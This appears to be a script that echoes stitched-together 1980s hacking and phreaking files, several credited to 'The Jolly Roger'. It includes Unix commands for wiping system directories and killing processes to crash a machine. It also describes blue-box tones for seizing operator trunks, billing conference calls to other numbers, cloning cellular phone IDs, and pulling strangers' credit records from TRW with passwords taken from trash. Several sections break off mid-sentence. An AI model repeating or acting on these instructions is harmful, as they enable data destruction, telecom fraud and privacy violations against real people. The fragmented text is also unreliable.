echo Which stands for 'write all'. By the way, on a few systems, all you have to do is hit the <return> key to end the message, but on others you 
echo must hit the cntl-D key. To send a single message to a user, say
echo ''=>'' write username
echo this is very handy again If you send the sequence of characters discussed at the very beginning of this article, you can have the super-user 
echo terminal do tricks for you again.
echo Privs:
echo If you want superuser privs, you can either log in as root, or edit your acct. so it can say
echo ''=>'' su
echo this now gives you the # prompt, and allows you to completely by-pass the protection. The wonderful security conscious developers at bell 
echo made it very difficult to do much without privs, but once you have them, there is absolutely nothing stopping you from doing anything you want 
echo to. To bring down a unix system:
echo ''=>'' chdir /bin
echo ''=>'' rm *
echo this wipes out the pathname bin, where all the system maintenance files are. Or try:
echo ''=>'' r -r
echo This recursively removes everything from the system except the remove command itself. Or try:
echo ''=>'' kill -1,1
echo ''=>'' sync
echo This wipes out the system devices from operation. When you are finally sick and tired from hacking on the vax systems, just hit your cntl-d and 
echo repeat key, and you will eventually be logged out.
echo The reason this file seems to be very sketchy is the fact that bell has 7 licensed versions of unix out in the public domain, and these commands 
echo are those common to all of them. I recommend you hack onto the root or bin directory, since they have the highest levels of privs, and there is 
echo really not much you can do 'except develop software' without them.

echo 108.Verification Circuits by The Jolly Roger
echo 1.One busy verification conference circuit is always provided. The circuit is a three-way conference bridge that enables an operator to verify 
echo the busy/idle condition of a subscriber line. Upon request of a party attempting to reach a specified directory number, the operator dials 
echo the called line number to determine if the line is in use, if the receiver is off the hook, or if the line is in lockout due to a fault condition. The 
echo operator then returns to the party trying to reach the directory number and states the condition of the line. Lines with data security can not 
echo be accessed for busy verification when the line is in use.'Refer also to data security.'
echo 2.Three ports are assigned to each busy verification conference circuit. One port is for operator access and two ports are used to split an 
echo existing connection. To verify the busy/idle condition of a line, the operator established a connection to the operator access port and dials 
echo the directory number of the line to be verified. If the line is in use, the existing connection is broken and immediately re-established through 
echo the other two ports of the busy verification circuit without interruption. Busy verification circuit is controlled by access code. A dedicated 
echo trunk can be used but is not necessary.
echo 3.The busy verification circuit also can be used for test verify from the wire chiefs test panel B. Additional busy verification conference 
echo circuits '002749' there it is right out of an ESS manual word for word Not counting the

echo 110.The BLAST Box by The Jolly Roger
echo Ever want to really make yourself be heard? Ever talk to someone on the phone who just doesn't shut up? Or just call the operator and pop her 
echo eardrum? Well, up until recently it has been impossible for you to do these things. That is, unless of course you've got a blast box. All a blast 
echo box is, is a really cheap amplifier, (around 5 watts or so) connected in place of the microphone on your telephone. It works best on model 500 
echo ATandT Phones, and if constructed small enough, can be placed inside the phone.
echo Construction:
echo Construction is not really important. Well it is, but since I'm letting you make
echo your own amp, I really don't have to include this.
echo Usage:
echo Once you've built your blast box, simply connect a microphone (or use the microphone from the phone) to the input of the amplifier, and presto. 
echo There it is. Now, believe it or not, this device actually works. (At least on crossbar.) It seems that Illinois bell switching systems allow quite a lot 
echo of current to pass right through the switching office, and out to whoever you're calling. When
echo you talk in the phone, it comes out of the other phone (again it works best if the phone that you're calling has the standard western electric 
echo earpiece) incredibly loud. This device is especially good for PBS Subscription drives. Have "Phun", and don't get caught

echo 111.Dealing with the Rate and Route Operator by The Jolly Roger
echo It seems that fewer and fewer people have blue boxes these days, and that is really too bad. Blue boxes, while not all that great for making 
echo free calls (since the TPC can tell when the call was made, as well as where it was too and from), are really a lot of fun to play with. Short of 
echo becoming a real live TSPS operator, they are about the only way you can really play with the network.
echo For the few of you with blue boxes, here are some phrases which may make life easier when dealing w ith the rate and route (RandR) operators. 
echo To get the RandR op, you send a KP + 141 + ST. In some areas you may need to put another NPA before the 141 (i.e., KP + 213 + 141 + ST), if 
echo you have no local RandR ops.
echo The RandR operator has a myriad of information, and all it takes to get this data is mumbling cryptic phrases. There are basically four special 
echo phrases to give the RandR ops. They are NUMBERS route, DIRECTORY route, OPERATOR route, and PLACE NAME.
echo To get an RandR an area code for a city, one can call the RandR operator and ask for the numbers route. For example, to find the area code for 
echo Carson City, Nevada, we'd ask the RandR op for "Carson City, Nevada, numbers route, please." and get the answer, "Right... 702 plus." meaning 
echo that 702 plus 7 digits gets us there.
echo Sometimes directory assistance isn't just NPA+131. The way to get these routings is to call RandR and ask for "Anaheim, California, directory 
echo route, please." Of course, she'd tell us it was 714 plus, which means 714 + 131 gets us the D.A. op there. This is sort of pointless example, but 
echo I couldn't come up with a better one on short notice.
echo Let's say you wanted to find out how to get to the inward operator for Sacremento, California. The first six digits of a number in that city will 
echo be required (the NPA and an NXX). For example, let us use 916 756. We would call RandR, and when the operator answered, say, "916 756, 
echo operator route, please." The
echo operator would say, "916 plus 001 plus." This means that 916 + 001 + 121 will get you the inward operator for Sacramento. Do you know the 
echo city which corresponds to 503 640? The RandR operator does, and will tell you that it is Hillsboro, Oregon, if you sweetly ask for "Place name, 
echo 503 640, please."
echo For example, let's say you need the directory route for Sveg, Sweden. Simply call RandR, and ask for, "International, Baden, Switzerland. TSPS 
echo directory route, please." In response to this, you'd get, "Right... Directory to Sveg, Sweden. Country code 46 plus 1170." So you'd route 
echo yourself to an international sender, and send 46 + 1170 to get the D.A. operator in Sweden.
echo Inward operator routings to various countries are obtained the same way "International, London, England, TSPS inward route, please." and get 
echo "Country code 44 plus 121." Therefore, 44 plus 121 gets you inward for London.
echo Inwards can get you language assistance if you don't speak the language. Tell the foreign inward, "United States calling. Language assistance 
echo in completing a call to (called party) at (called number)."
echo RandR operators are people are people too, y'know. So always be polite, make sure use of 'em, and dial with care.

echo 112.Cellular Phreaking by The Jolly Roger
echo The cellular/mobile phone system is one that is perfectly set up to be exploited by phreaks with the proper knowledge and equipment. Thanks 
echo to deregulation, the regional BOC's (Bell Operating Companies) are scattered and do not communicate much with each other. Phreaks can take 
echo advantage of this by pretending to be mobile phone customers whose "home base" is a city served by a different BOC, known as a "roamer". 
echo Since it is impractical for each BOC to keep track of the customers of all the other BOC's, they will usually allow the customer to make the calls 
echo he wishes, often with a surcharge of some sort.
echo The bill is then forwarded to the roamer's home BOC for collection. However, it is fairly simple (with the correct tools) to create a bogus ID 
echo number for your mobile phone, and pretend to be a roamer from some other city and state, that's "just visiting". When your BOC tries to collect 
echo for the calls from your alleged "home BOC", they will discover you are not a real customer; but by then, you can create an entirely new 
echo electronic identity, and use that instead.
echo How does the cellular system know who is calling, and where they are? When a mobile phone enters a cell's area of transmission, it transmits 
echo its phone number and its 8 digit ID number to that cell, who will keep track of it until it gets far enough away that the sound quality is sufficiently 
echo diminished, and then the phone is "handed off" to the cell that the customer has walked or driven into. This process continues as long as the 
echo phone has power and is turned on. If the phone is turned off (or the car is), someone attempting to call the mobile phone will receive a 
echo recording along the lines of "The mobile phone customer you have dialed has left the vehicle or driven out of the service area." When a call is 
echo made to a mobile phone, the switching equipment will check to see if the mobile phone being called is "logged in", so to speak, or present in one 
echo of the cells. If it is, the call will then act (to the speaking parties) just like a normal call - the caller may hear a busy tone, the phone may just 
echo ring, or the call may be answered.
echo How does the switching equipment know whether or not a particular phone is authorized to use the network? Many times, it doesn't. When a 
echo dealer installs a mobile phone, he gives the phone's ID number (an 8 digit hexadecimal number) to the local BOC, as well as the phone number 
echo the BOC assigned to the customer. Thereafter, whenever a phone is present in one of the cells, the two numbers are checked - they should 
echo be registered to the same person. If they don't match, the telco knows that an attempted fraud is taking place (or at best, some transmission 
echo error) and will not allow calls to be placed or received at that phone. However, it is impractical (especially given the present state of 
echo deregulation) for the telco to have records of every cellular customer of every BOC. Therefore, if you're going to create a fake ID/phone 
echo number combination, it will need to be "based" in an area that has a cellular system (obviously), has a different BOC than your local area does, 
echo and has some sort of a "roamer"
echo agreement with your local BOC.
echo How can one "phreak" a cellular phone? There are three general areas when phreaking cellular phones; using one you found in an unlocked 
echo car (or an unattended walk-about model), modifying your own chip set to look like a different phone, or recording the phone number/ID number 
echo combinations sent by other local cellular phones, and using those as your own. Most cellular phones include a crude "password" system to 
echo keep unauthorized users from using the phone - however, dealers often set the password (usually a 3 to 5 digit code) to the last four digits of 
echo the customer's mobile phone number. If you can find that somewhere on the phone, you're in luck. If not, it shouldn't be TOO hard to hack, since 
echo most people aren't smart enough to use something besides "1111", "1234", or whatever. If you want to modify the chip set in a cellular phone 
echo you bought (or stole), there are two chips (of course, this depends on the model and
echo manufacturer, yours may be different) that will need to be changed - one installed at the manufacturer (often epoxied in) with the phone's ID 
echo number, and one installed by the dealer with the phone number, and possible the security code. To do this, you'll obviously need an EPROM 
echo burner as well as the same sort of chips used in the phone (or a friendly and unscrupulous dealer). As to recording the numbers of other 
echo mobile phone customers and using them; as far as I know, this is just theory... but it seems quite possible, if you've got the equipment to record 
echo and decode it. The cellular system would probably freak out if two phones (with valid ID/phone number combinations) were both present in the 
echo network at once, but it remains to be seen what will happen.

echo 114.How to start your own conferences by The Jolly Roger
echo Black Bart showed how to start a conference call thru an 800 exchange, and I will now explain how to start a conference call in a more 
echo orthodox fashion, the 2600Hz. Tone.
echo Firstly, the fone company has what is called switching systems. There are several types, but the one we will concern ourselves with, is ESS 
echo (electronic switching system). If your area is zoned for ESS, do not start a conference call via the 2600Hz. Tone, or bell security will nail your 
echo ass To find out if you are under ESS, call your local business office, and ask them if you can get call waiting/forwarding, and if you can, that 
echo means that you are in ESS country, and conference calling is very, very dangerous Now, if you are not in ESS, you will need the following 
echo equipment:
echo · An Apple CAT II modem
echo · A copy of TSPS 2 or CAT'S Meow
echo · A touch tone fone line
echo · A touch tone fone. (True tone)
echo Now, with TSPS 2, do the following:
echo 1.Run tsps 2
echo 2.Chose option 1
echo 3.Chose option 6
echo 4.Chose sub-option 9
echo 5.Now type: 1-514-555-1212 (dashes are not needed)
echo 6.Listen with your handset, and as soon as you hear a loud click, then type: $
echo 7.To generate the 2600 hz. Tone. This obnoxious tone will continue for a few
echo 8.Seconds, then listen again and you should hear another loud 'click'.
echo 9.Now type: km2130801050s
echo · 'K' = kp tone
echo · 'M' = multi frequency mode
echo · 'S' = s tone
echo 10.Now listen to the handset again, and wait until you hear the 'click' again. Then type: km2139752975s
echo · 2139751975 is the number to bill the conference call to. 
echo Note: 213-975-1975 is a disconnected number, and I strongly advise that you only bill the call to this number, or the fone company will find out, 
echo and then.. remember, conference calls are itemized, so if you do bill it to an enemy's number, he can easily find out who did it and he can bust 
echo you
echo You should now hear 3 beeps, and a short pre-recorded message. From here on, everything is all menu driven.
echo Conference call commands
echo From the '#' mode:
echo · 1 = call a number
echo · 6 = transfer control
echo · 7 = hangs up the conference call
echo · 9 = will call a conference operator
echo Stay away from 7 and 9 If you get a busy signal after km2130801050s, that means that 
echo the teleconference line is temporarily down. Try later, preferably from 9am to 5pm week days, since conference calls are primarily designed

echo Now that you have built it take two green wires of the same length and strip the ends, twist two ends together and connect them to green1 
echo and place a piece of tape on it with "line #1" writing on it.
echo Continue the process with red1 only use red wire. Repeat with red2 and green2 but change to line #2.
echo HOW TO INSTALL
echo You will need to find two phone lines that are close together. Label one of the phone lines "Line #1". Cut the phone lines and take the outer 
echo coating off it. There should be 4 wires. Cut the yellow and black wires off and strip the red and green wires for both lines.
echo Line #1 should be in two pieces. Take the green wire of one end and connect it to one of the green wires on the gold box. Take the other half 
echo of line #1 and hook the free green wire to the green wire on the phone line. Repeat the process with red1 and the other line. All you need to do 
echo now is to write down the phone numbers of the place you hooked it up at and go home and call it. You should get a dial tone If not, try

echo 116.The History of ESS by The Jolly Roger
echo Of all the new 1960s wonders of telephone technology - satellites, ultra modern Traffic Service Positions (TSPS) for operators, the 
echo picturephone, and so on - the one that gave Bell Labs the most trouble, and unexpectedly became the greatest development effort in Bell 
echo System's history, was the perfection of an electronic switching system, or ESS.
echo It may be recalled that such a system was the specific end in view when the project that had culminated in the invention of the transistor had 
echo been launched back in the 1930s. After successful accomplishment of that planned miracle in 1947-48, further delays were brought about by 
echo financial stringency and the need for further development of the transistor itself. In the early 1950s, a Labs team began serious work on 
echo electronic switching. As early as 1955, Western Electric became involved when five engineers from the Hawthorne works were assigned to 
echo collaborate with the Labs on the project. The president of ATandT in 1956, wrote confidently, "At Bell Labs, development of the new electronic 
echo switching system is going full speed ahead. We are sure this will lead to many improvements in service and also to greater efficiency. The first 
echo service trial will start in Morris, Ill., in 1959." Shortly thereafter, Kappel said that the cost of the whole project would probably be $45 million.
echo But it gradually became apparent that the development of a commercially usable electronic switching system - in effect, a computerized 
echo telephone exchange - presented vastly greater technical problems than had been anticipated, and that, accordingly, Bell Labs had vastly 
echo underestimated both the time and the investment needed to do the job. The year 1959 passed without the promised first trial at Morris, Illinois; it 
echo was finally made in November 1960, and quickly showed how much more work remained to be done. As time dragged on and costs mounted, 
echo there was a concern at ATandT and something approaching panic at Bell Labs. But the project had to go forward; by this time the investment 
echo was too great to be sacrificed, and in any case, forward projections of increased demand for telephone service indicated that within a few 
echo years a time would come when, without the quantum leap in speed and flexibility that electronic switching would provide, the national network 
echo would be unable to meet the demand. In November 1963, an all-electronic switching system went into use at the Brown Engineering Company 
echo at Cocoa Beach, Florida. But this was a small installation, essentially another test installation, serving only a single company. Kappel's tone on 
echo the subject in the 1964 annual report was, for him, an almost apologetic: "Electronic switching equipment must be manufactured in volume to 
echo unprecedented standards of reliability.... To turn out the equipment economically and with good speed, mass production methods must be 
echo developed; but, at the same time, there can be no loss of precision..." Another year and millions of dollars later, on May 30, 1965, the first 
echo commercial electric central office was put into service at Succasunna, New Jersey.
echo Even at Succasunna, only 200 of the town's 4,300 subscribers initially had the benefit of electronic switching's added speed and additional 
echo services, such as provision for three party conversations and automatic transfer of incoming calls. But after that, ESS was on its way. In 
echo January 1966, the second commercial installation, this one serving 2,900 telephones, went into service in Chase, Maryland. By the end of 1967 
echo there were additional ESS offices in California, Connecticut, Minnesota, Georgia, NY, Florida, and Pennsylvania; by the end of 1970 there were 
echo 120 offices serving 1.8 million customers; and by 1974 there were 475 offices serving 5.6 million customers.
echo The difference between conventional switching and electronic switching is the difference between "hardware" and "software"; in the former 
echo case, maintenance is done on the spot, with screwdriver and pliers, while in the case of electronic switching, it can be done remotely, by 
echo computer, from a central point, making it possible to have only one or two technicians on duty at a time at each switching center. The 
echo development program, when the final figures were added up, was found to have required a staggering four thousand man-years of work at 
echo Bell Labs and to have cost not $45 million but $500 million

echo 4.The middle of the loop on the left side (the left of "()") you should run a wire down to the "+" which has nothing attached to it. There is a 
echo .0047 capacitor on the correct piece of wire.
echo 5.For the microphone use a magnetic earphone (1k to 2k).
echo 6.Where you see "[]" is the antenna. Use about 8 feet of wire to broadcast approx. 300ft. Part 15 of the FCC rules and regulation says you 
echo can't broadcast over 300 feet without a license. (Hahaha). Use more wire for an antenna for longer distances. (Attach it to the black wire 
echo on the fone line for about a 250 foot antenna)
echo Operation of the Lunch Box
echo This transmitter will send the signals over the AM radio band. You use the variable capacitor to adjust what freq. you want to use. Find a good 
echo unused freq. down at the lower end of the scale and you're set. Use the 2 meg pot. to adjust gain. Just fuck with it until you get what sounds 
echo good. The switch on the 2meg is for turning the Lunch Box on and off. When everything is adjusted, turn on an AM radio adjust it to where you 
echo think the signal is. Have a friend lay some shit thru the Box and tune in to it. That's all there is to it. The plans for a simple receiver are shown

echo 118.Olive Box Plans by The Jolly Roger
echo  This is a relatively new box, and all it basically does is serve as a phone ringer. You have two choices for ringers, a piezoelectric 
echo transducer (ringer), or a standard 8 ohm speaker. The speaker has a more pleasant tone to it, but either will do fine. This circuit can also be 
echo used in conjunction with a rust box to control an external something or other when the phone rings. Just connect the 8 ohm speaker output to 
echo the inputs on the rust box, and control the pot to tune it to light the light (which can be replaced by a relay for external controlling) when the 
echo phone rings.

echo 120.More TRW Info by The Jolly Roger
echo TRW is a large database in which company's and banks can run credit checks on their customers. Example: John Jones orders $500 worth of 
echo stereo equipment from the Joe Blow Electronic distributing Co. Well it could be that he gave the company a phony credit card number, or 
echo doesn't have enough credit, etc. Well they call up TRW and then run a check on him, TRW then lists his card numbers (everything from sears to 
echo visa) and tells the numbers, credit, when he lost it last (if he ever did) and then of course tells if he has had any prior problems paying his bills.
echo I would also like to add that although TRW contains information on millions of people, not every part of the country is served, although the major 
echo area are.. So if you hate someone and live in a small state, you probably wont be able to order him 300 pink toilet seats from K-mart.
echo Logging on
echo To log on, you dial-up your local access number (or long-distance, what ever turns you on) and wait for it to say "TRW" at this prompt, you 
echo type either an "A" or a "Ctrl-G" and it will say "circuit building in progress" it will wait for a minute and then clear the screen, now you will type 
echo one of the following.
echo Tca1
echo Tca2
echo Tnj1
echo Tga1
echo This is to tell it what geographical area the customer is in, it really doesn't matter which you use, because TRW will automatically switch when 
echo it finds the record..
echo Next, you will type in the pswd and info on the person you are trying to get credit info on. You type it in a format like this:
echo Rts Pswd Lname Fname ...,House number First letter of street name Zip <cr> now you type ctrl s and 2 ctrl-Q's here is what it looks like in real 
echo life:
echo Ae: Dialing xxx-xxx-xxxx
echo (screen clear)
echo TRW ^G
echo circuit building in progress
echo (pause . . . screen clear)
echo Tca1
echo Rtc 3966785-cm5 Johnson David ...,4567
echo R 56785
echo ^s ^q ^q
echo and then it will wait for a few seconds and print out the file on him (if it can locate one for the guy)
echo Note: You may have to push return when you first connect to get the systems attention.
echo Getting Your Passwords
echo To obtain pswds, you go down to your favorite bank or sears store and dig through the trash (hence the name trashing) looking for printouts, if 
echo they are a big enough place, and live in a TRW area, then they will probably have some. The printouts will have the 7 digit subscriber code, 
echo leaving the 3-4 digit pswd up to you. Much like trashing down at good old ma bell.

echo The long awaited prequil to Phreaker's Guide has finally arrived. Conceived from the boredom and loneliness that could only be derived from: 
echo The Traveler But now, he has returned in full strength (after a small vacation) and is here to 'World Premiere' the new files everywhere. Stay 
echo cool. This is the prequil to the first one, so just relax. This is not made to be an exclusive ultra elite file, so kinda calm down and watch in the 
echo background if you are too cool for it.
echo Phreak Dictionary
echo Here you will find some of the basic but necessary terms that should be known by any phreak who wants to be respected at all.
echo Phreak:
echo 1.The action of using mischievous and mostly illegal ways in order to not pay for some sort of telecommunications bill, order, 
echo transfer, or other service. It often involves usage of highly illegal boxes and machines in order to defeat the security that is set 
echo up to avoid this sort of happening. [fr'eaking]. v.
echo 2.A person who uses the above methods of destruction and chaos in order to make a better life for all. A true phreaker will not go 
echo against his fellows or narc on people who have ragged on him or do anything termed to be dishonorable to phreaks. [fr'eek]. n.
echo 3.A certain code or dialup useful in the action of being a phreak. (Example: "I hacked a new metro phreak last night.")
echo Switching System: 
echo 1.There are 3 main switching systems currently employed in the US, and a few other systems will be mentioned as background.
echo · SxS: This system was invented in 1918 and was employed in over half of the country until 1978. It is a very basic 
echo system that is a general waste of energy and hard work on the linesman. A good way to identify this is that it requires 
echo a coin in the phone booth before it will give you a dial tone, or that no call waiting, call forwarding, or any other such 
echo service is available. Stands for: Step by Step
echo · XB: This switching system was first employed in 1978 in order to take care of most of the faults of SxS switching. 
echo Not only is it more efficient, but it also can support different services in various forms. XB1 is Crossbar Version 1. 
echo That is very limited and is hard to distinguish from SxS except by direct view of the wiring involved. Next up was XB4, 
echo Crossbar Version 4. With this system, some of the basic things like DTMF that were not available with SxS can be 
echo accomplished. For the final stroke of XB, XB5 was created. This is a service that can allow DTMF plus most 800 type 
echo services (which were not always available.) Stands for: Crossbar.
echo · ESS: A nightmare in telecom. In vivid color, ESS is a pretty bad thing to have to stand up to. It is quite simple to identify. 
echo Dialing 911 for emergencies, and ANI [see ANI below] are the most common facets of the dread system. ESS has the 
echo capability to list in a person's caller log what number was called, how long the call took, and even the status of the 
echo conversation (modem or otherwise.) Since ESS has been employed, which has been very recently, it has gone 
echo through many kinds of revisions. The latest system to date is ESS 11a, that is employed in Washington D.C. for 
echo security reasons. ESS is truly trouble for any phreak, because it is 'smarter' than the other systems. For instance, if 
echo on your caller log they saw 50 calls to 1-800-421-9438, they would be able to do a CN/A [see Loopholes below] on 
echo your number and determine whether you are subscribed to that service or not. This makes most calls a hazard, 
echo because although 800 numbers appear to be free, they are recorded on your caller log and then right before you 
echo receive your bill it deletes the billings for them. But before that the are open to inspection, which is one reason why 
echo extended use of any code is dangerous under ESS. Some of the boxes [see Boxing below] are unable to function in 
echo ESS. It is generally a menace to the true phreak. Stands For: Electronic Switching System. Because they could appear 
echo on a filter somewhere or maybe it is just nice to know them anyways.
echo · SSS: Strowger Switching System. First non-operator system available.
echo · WES: Western Electronics Switching. Used about 40 years ago with some minor places out west.
echo Boxing: 
echo 1.The use of personally designed boxes that emit or cancel electronical impulses that allow simpler acting while phreaking. Through 
echo the use of separate boxes, you can accomplish most feats possible with or without the control of an operator.
echo 2.Some boxes and their functions are listed below. Ones marked with '*' indicate that they are not operatable in ESS.
echo · *Black Box:Makes it seem to the phone company that the phone was never picked up.
echo · Blue Box: Emits a 2600hz tone that allows you to do such things as stack a trunk line, kick the operator off line, and 
echo others.
echo · Red Box: Simulates the noise of a quarter, nickel, or dime being dropped into a payphone.
echo · Cheese Box: Turns your home phone into a pay phone to throw off traces (a red box is usually needed in order to call 
echo out.)
echo · *Clear Box: Gives you a dial tone on some of the old SxS payphones without putting in a coin.
echo · Beige Box: A simpler produced linesman's handset that allows you to tap into phone lines and extract by 
echo eavesdropping, or crossing wires, etc.
echo · Purple Box: Makes all calls made out from your house seem to be local calls.
echo ANI [ANI]:
echo 1.Automatic Number Identification. A service available on ESS that allows a phone service [see Dialups below] to record the number 
echo that any certain code was dialed from along with the number that was called and print both of these on the customer bill.
echo 2.dialups [see Dialups below] are all designed just to use ANI. Some of the services do not have the proper equipment to read the ANI 
echo impulses yet, but it is impossible to see which is which without being busted or not busted first.
echo Dialups [dy'l'ups]: 
echo 1.Any local or 800 extended outlet that allows instant access to any service such as MCI, Sprint, or ATandT that from there can be 
echo used by hand-picking or using a program to reveal other peoples codes which can then be used moderately until they find out 
echo about it and you must switch to another code (preferably before they find out about it.)
echo 2.Dialups are extremely common on both senses. Some dialups reveal the company that operates them as soon as you hear the 
echo tone. Others are much harder and some you may never be able to identify. A small list of dialups:
echo 1-800-421-9438 (5 digit codes)
echo 1-800-547-6754 (6 digit codes)
echo 1-800-345-0008 (6 digit codes)
echo 1-800-734-3478 (6 digit codes)
echo 1-800-222-2255 (5 digit codes)
echo 3.Codes: Codes are very easily accessed procedures when you call a dialup. They will give you some sort of tone. If the tone does 
echo not end in 3 seconds, then punch in the code and immediately following the code, the number you are dialing but strike the '1' in 
echo the beginning out first. If the tone does end, then punch in the code when the tone ends. Then, it will give you another tone. 
echo Punch in the number you are dialing, or a '9'. If you punch in a '9' and the tone stops, then you messed up a little. If you punch in 
echo a tone and the tone continues, then simply dial then number you are calling without the '1'.
echo 4.All codes are not universal. The only type that I know of that is truly universal is Metrophone. Almost every major city has a local 
echo Metro dialup (for Philadelphia, (215)351-0100/0126) and since the codes are universal, almost every phreak has used them 
echo once or twice. They do not employ ANI in any outlets that I know of, so feel free to check through your books and call 555-1212 
echo or, as a more devious manor, subscribe yourself. Then, never use your own code. That way, if they check up on you due to 
echo your caller log, they can usually find out that you are subscribed. Not only that but you could set a phreak hacker around that 
echo area and just let it hack away, since they usually group them, and, as a bonus, you will have their local dialup.
echo 5.950's. They seem like a perfectly cool phreakers dream. They are free from your house, from payphones, from everywhere, and 
echo they host all of the major long distance companies (950)1044 <MCI>, (950)1077 <Sprint>, 950-1088 <S+ylines>, 950-1033 <US 
echo Telecom>.) Well, they aren't. They were designed for ANI. That is the point, end of discussion.
echo  A phreak dictionary. If you remember all of the things contained on that file up there, you may have a better chance of doing whatever it is 
echo you do. This next section is maybe a little more interesting...
echo Blue Box Plans:
echo These are some blue box plans, but first, be warned, there have been 2600hz tone detectors out on operator trunk lines since XB4. The idea 
echo behind it is to use a 2600hz tone for a few very naughty functions that can really make your day lighten up. But first, here are the plans, or the 
echo heart of the file:
echo 700 : 1 : 2 : 4 : 7 : 11 :
echo 900 : + : 3 : 5 : 8 : 12 :
echo 1100 : + : + : 6 : 9 : KP :
echo 1300 : + : + : + : 10 : KP2 :
echo 1500 : + : + : + : + : ST :
echo  : 700 : 900 :1100 :1300 :1500 :
echo Stop Before you diehard users start piecing those little tone tidbits together, there is a simpler method. If you have an Apple-Cat with a program 
echo like Cat's Meow IV, then you can generate the necessary tones, the 2600hz tone, the KP tone, the KP2 tone, and the ST tone through the dial 
echo section. So if you have that I will assume you can boot it up and it works, and I'll do you the favor of telling you and the other users what to do 
echo with the blue box now that you have somehow constructed it. The connection to an operator is one of the most well known and used ways of 
echo having fun with your blue box. You simply dial a TSPS (Traffic Service Positioning Station, or the operator you get when you dial '0') and blow 
echo a 2600hz tone through the line. Watch out After you have done that, it is quite simple to have fun with it. Blow a KP tone 
echo to start a call, a ST tone to stop it, and a 2600hz tone to hang up. Once you have connected to it, here are some fun numbers to call with it:
echo  0-700-456-1000 Teleconference (free, because you are the operator)
echo  (Area code)-101 Toll Switching
echo  (Area code)-121 Local Operator (hehe)
echo  (Area code)-131 Information
echo  (Area code)-141 Rate and Route
echo  (Area code)-181 Coin Refund Operator
echo  (Area code)-11511 Conference operator (when you dial 800-544-6363)
echo  Well, those were the tone matrix controllers for the blue box and some other helpful stuff to help you to start out with. But those are only the 
echo functions with the operator. There are other k-fun things you can do with it.
echo More advanced Blue Box Stuff:
echo Oops. Small mistake up there. I forgot tone lengths. Um, you blow a tone pair out for up to 1/10 of a second with another 1/10 second for 
echo silence between the digits. KP tones should be sent for 2/10 of a second. One way to confuse the 2600hz traps is to send pink noise over the 
echo channel (for all of you that have decent BSR equalizers, there is major pink noise in there.)
echo Using the operator functions is the use of the 'inward' trunk line. That is working it from the inside. From the 'outward' trunk, you can do such 
echo things as make emergency breakthrough calls, tap into lines, busy all of the lines in any trunk (called 'stacking'), enable or disable the TSPS's, 
echo and for some 4a systems you can even re-route calls to anywhere.
echo All right. The one thing that every complete phreak guide should be without is blue box plans, since they were once a vital part of phreaking. 
echo Another thing that every complete file needs is a complete listing of all of the 800 numbers around so you can have some more fun.
echo  /-/ 800 Dialup Listings /-/
echo 1-800-345-0008 (6) 1-800-547-6754 (6)
echo 1-800-245-4890 (4) 1-800-327-9136 (4)
echo 1-800-526-5305 (8) 1-800-858-9000 (3)
echo 1-800-437-9895 (7) 1-800-245-7508 (5)
echo 1-800-343-1844 (4) 1-800-322-1415 (6)
echo 1-800-437-3478 (6) 1-800-325-7222 (6)
echo All right, set Cat Hacker 1.0 on those numbers and have a fuck of a day. That is enough with 800 codes, by the time this gets around to you I 
echo don't know what state those codes will be in, but try them all out anyways and see what you get. On some 800 services now, they have an 
echo operator who will answer and ask you for your code, and then your name. Some will switch back and forth between voice and tone 
echo verification, you can never be quite sure which you will be up against.
echo Armed with this knowledge you should be having a pretty good time phreaking now. But class isn't over yet, there are still a couple important 
echo rules that you should know. If you hear continual clicking on the line, then you should assume that an operator is messing with something, 
echo maybe even listening in on you. It is a good idea to call someone back when the phone starts doing that. If you were using a code, use a 
echo different code and/or service to call him back.
echo A good way to detect if a code has gone bad or not is to listen when the number has been dialed. If the code is bad you will probably hear the 
echo phone ringing more clearly and more quickly than if you were using a different code. If someone answers voice to it then you can immediately 
echo assume that it is an operative for whatever company you are using. The famed '311311' code for Metro is one of those. You would have to be 
echo quite stupid to actually respond, because whoever you ask for the operator will always say 'He's not in right now, can I have him call you 
echo back?' and then they will ask for your name and phone number. Some of the more sophisticated companies will actually give you a carrier on a 
echo line that is supposed to give you a carrier and then just have garbage flow across the screen like it would with a bad connection. That is a 
echo feeble effort to make you think that the code is still working and maybe get you to dial someone's voice, a good test for the carrier trick is to dial 
echo a number that will give you a carrier that you have never dialed with that code before, that will allow you to determine whether the code is 
echo good or not. For our next section, a lighter look at some of the things that a phreak should not be without. A vocabulary.
echo A few months ago, it was a quite strange world for the modem people out there. But now, a phreaker's vocabulary is essential if you wanna 
echo make a good impression on people when you post what you know about certain subjects.
echo " /-/ Vocabulary /-/"
echo - Do not misspell except certain exceptions:
echo  "phone -> fone"
echo  "freak -> phreak"
echo - Never substitute 'z's for 's's. (i.e. codez -> codes)
echo - Never leave many characters after a post (i.e. Hey Dudes@#@@)
echo - NEVER use the 'k' prefix (k-kool, k-rad, k-whatever)
echo - Do not abbreviate. (I got lotsa wares w/ docs)
echo - Never substitute '0' for 'o' (r0dent, l0zer).
echo - Forget about ye old upper case, it looks ruggyish.
echo All right, that was to relieve the tension of what is being drilled into your minds at the moment. Now, however, back to the teaching course. 
echo Here are some things you should know about phones and billings for phones, etc.
echo LATA: Local Access Transference Area. Some people who live in large cities or areas may be plagued by this problem. For instance, let's say 
echo you live in the 215 area code under the 542 prefix (Ambler, Fort Washington). If you went to dial in a basic Metro code from that area, for 
echo instance, 351-0100, that might not be counted under unlimited local calling because it is out of your LATA. For some LATA's, you have to dial a 
echo '1' without the area code before you can dial the phone number. That could prove a hassle for us all if you didn't realize you would be billed for 
echo that sort of call. In that way, sometimes, it is better to be safe than sorry and phreak.
echo The Caller Log: In ESS regions, for every household around, the phone company has something on you called a Caller Log. This shows every 
echo single number that you dialed, and things can be arranged so it showed every number that was calling to you. That's one main disadvantage of 
echo ESS, it is mostly computerized so a number scan could be done like that quite easily. Using a dialup is an easy way to screw that, and is 
echo something worth remembering. Anyways, with the caller log, they check up and see what you dialed. Hmm... you dialed 15 different 800 
echo numbers that month. Soon they find that you are subscribed to none of those companies. But that is not the only thing. Most people would 
echo imagine "But wait". To those people, it is a nice thought, but 800 numbers are picked up on the 
echo caller log until right before they are sent off to you. So they can check right up on you before they send it away and can note the fact that you 
echo fucked up slightly and called one too many 800 lines.
echo Right now, after all of that, you should have a pretty good idea of how to grow up as a good phreak. Follow these guidelines, don't show off, 
echo and don't take unnecessary risks when phreaking or hacking.

echo Researchers at any of these universities that have funded grants can access the
echo six supercomputer centers funded by the NSF:
echo John Von Neuman Supercomputer Center
echo National Center for Atmospheric Research
echo Cornell National Supercomputer Facility
echo National Center for Supercomputing Applications
